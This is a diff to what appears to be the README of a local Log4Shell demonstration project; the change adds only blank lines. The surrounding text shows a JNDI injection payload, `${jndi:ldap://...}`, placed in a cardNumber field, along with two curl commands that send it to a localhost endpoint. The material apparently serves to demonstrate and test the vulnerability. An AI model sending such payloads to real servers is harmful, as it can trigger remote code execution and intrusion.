@@ -21,5 +21,7 @@ http://localhost:8080/api/infected-method
 cardNumber: ${jndi:ldap://localhost:8082/api/long-wait}
 
 ####Curl request example
+    
     curl --location --request GET 'localhost:8080/api/infected-method' --form 'cardNumber=${jndi:ldap://localhost:8082/api/long-wait}'
+    
     curl --location --request GET 'localhost:8080/api/infected-method?cardNumber=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A8082%2Fapi%2Flong-wait%7D'
